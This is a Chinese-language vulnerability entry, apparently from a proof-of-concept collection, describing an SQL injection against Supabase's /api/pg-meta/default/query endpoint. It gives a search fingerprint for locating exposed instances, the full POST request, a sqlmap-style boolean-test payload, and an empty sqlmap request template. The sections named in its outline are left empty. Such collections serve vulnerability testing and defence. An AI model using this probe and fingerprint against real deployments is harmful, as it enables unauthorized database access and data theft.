# Supabasequery存在SQL注入漏洞

- **系统**：Supabasequery　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="Supabase"`
- **请求**：`POST /api/pg-meta/default/query HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/json`　`Content-Length: 103`

**请求体 / payload**
```
{"query":"(SELECT CONCAT(CONCAT('qjpzq',(CASE WHEN (2016=2016) THEN '1' ELSE '0' END)),'qkbbq'))"}

sqlmap
POST /api/pg-meta/default/query HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: application/json
Content-Length: 103
{"query":""}
```

**其他**
- Supabase query存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Supabase